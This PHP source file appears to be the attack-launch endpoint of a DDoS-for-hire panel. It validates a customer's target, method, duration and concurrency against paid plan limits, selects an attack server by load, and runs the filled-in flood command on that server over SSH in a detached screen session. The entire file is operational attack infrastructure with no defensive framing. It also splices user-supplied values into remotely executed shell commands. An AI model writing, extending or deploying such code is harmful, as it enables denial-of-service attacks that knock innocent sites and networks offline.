<?php
/**
 * Create new attack
 */

$user = requireAuth();
$data = getJsonBody();

validateRequired($data, ['target', 'method', 'duration', 'concurrents']);

// Get settings
$maintenanceMode = db()->fetchOne("SELECT setting_value FROM settings WHERE setting_key = 'maintenance_mode'");
if ($maintenanceMode && $maintenanceMode['setting_value'] === '1') {
    errorResponse('System is under maintenance', 503);
}

// Sanitize and validate target
$target = sanitize($data['target']);
if (!validateTarget($target)) {
    errorResponse('Invalid target. Must be a valid URL (https://...) or IP address', 400);
}

$port = (int)($data['port'] ?? 80);
$method = sanitize($data['method']);
$duration = (int)$data['duration'];
$concurrents = (int)$data['concurrents'];

// Check cooldown
$lastAttack = db()->fetchOne(
    "SELECT started_at FROM attacks WHERE user_id = ? ORDER BY started_at DESC LIMIT 1",
    [$user['id']]
);

if ($lastAttack) {
    $lastTime = strtotime($lastAttack['started_at']);
    if (time() - $lastTime < RATE_LIMIT_ATTACKS) {
        errorResponse('Cooldown: Please wait 1 second between attacks', 429);
    }
}

// Get user's plan
$plan = db()->fetchOne("SELECT * FROM plans WHERE id = ?", [$user['plan']]);
if (!$plan) {
    $plan = db()->fetchOne("SELECT * FROM plans WHERE id = 'free'");
}

// Validate against plan limits
if ($duration > $plan['max_time']) {
    errorResponse("Max duration: {$plan['max_time']}s", 400);
}

if ($concurrents > $plan['max_concurrent']) {
    errorResponse("Max concurrent: {$plan['max_concurrent']}", 400);
}

// Check if method is in plan
$planMethods = db()->fetchAll(
    "SELECT method_id FROM plan_methods WHERE plan_id = ?",
    [$plan['id']]
);
$allowedMethods = array_column($planMethods, 'method_id');

if (!in_array($method, $allowedMethods)) {
    errorResponse('Method not available in your plan', 400);
}

// Check user's running attacks
$userRunning = db()->count('attacks', "user_id = ? AND status = 'running'", [$user['id']]);
if ($userRunning >= $plan['max_concurrent']) {
    errorResponse('Max concurrent attacks reached', 400);
}

// Check global capacity
$globalMaxSetting = db()->fetchOne("SELECT setting_value FROM settings WHERE setting_key = 'global_max_concurrent'");
$globalMax = $globalMaxSetting ? (int)$globalMaxSetting['setting_value'] : 500;

$globalRunning = db()->count('attacks', "status = 'running'");
if ($globalRunning >= $globalMax) {
    errorResponse('Global capacity reached', 503);
}

// Select best server
$server = db()->fetchOne(
    "SELECT s.* FROM attack_servers s 
     INNER JOIN server_methods sm ON s.id = sm.server_id 
     WHERE s.is_active = 1 AND s.status = 'online' AND sm.method_id = ?
     AND (s.current_load + ?) <= s.max_concurrent
     ORDER BY s.current_load ASC LIMIT 1",
    [$method, $concurrents]
);

if (!$server) {
    errorResponse('No available servers for this method', 503);
}

// Get method command for this server
$serverMethod = db()->fetchOne(
    "SELECT command FROM server_methods WHERE server_id = ? AND method_id = ?",
    [$server['id'], $method]
);

if (!$serverMethod) {
    errorResponse('Server not configured for this method', 500);
}

// Create attack
$attackId = generateUUID();
$screenName = $user['username'] . substr($attackId, -6);

// Build command
$command = $serverMethod['command'];
$command = str_replace('{target}', $target, $command);
$command = str_replace('{port}', $port, $command);
$command = str_replace('{duration}', $duration, $command);
$command = str_replace('{threads}', $concurrents, $command);
$command = str_replace('{time}', $duration, $command);
$command = str_replace('{site}', $target, $command);

// Build full start command
$startCmd = $server['start_command'] ?? 'screen -dmS {screen_name} {command}';
$fullCommand = str_replace('{screen_name}', $screenName, $startCmd);
$fullCommand = str_replace('{command}', $command, $fullCommand);
$fullCommand = str_replace('{username}', $user['username'], $fullCommand);
$fullCommand = str_replace('{attack_id}', $attackId, $fullCommand);

// Insert attack record
db()->insert('attacks', [
    'id' => $attackId,
    'user_id' => $user['id'],
    'username' => $user['username'],
    'target' => $target,
    'port' => $port,
    'method' => $method,
    'duration' => $duration,
    'concurrents' => $concurrents,
    'server_id' => $server['id'],
    'server_name' => $server['name'],
    'status' => 'running',
    'screen_name' => $screenName,
    'command' => $fullCommand
]);

// Update server load
db()->query(
    "UPDATE attack_servers SET current_load = current_load + ? WHERE id = ?",
    [$concurrents, $server['id']]
);

// Execute command via SSH (if SSH extension available)
if (function_exists('ssh2_connect')) {
    try {
        $connection = ssh2_connect($server['host'], $server['ssh_port'] ?? 22);
        if ($connection && ssh2_auth_password($connection, $server['ssh_user'], $server['ssh_password'])) {
            $stream = ssh2_exec($connection, $fullCommand);
            fclose($stream);
        }
    } catch (Exception $e) {
        error_log('SSH Error: ' . $e->getMessage());
    }
}

// Sleep for cooldown
sleep(1);

jsonResponse([
    'id' => $attackId,
    'status' => 'running',
    'server' => $server['name'],
    'screen_name' => $screenName
]);
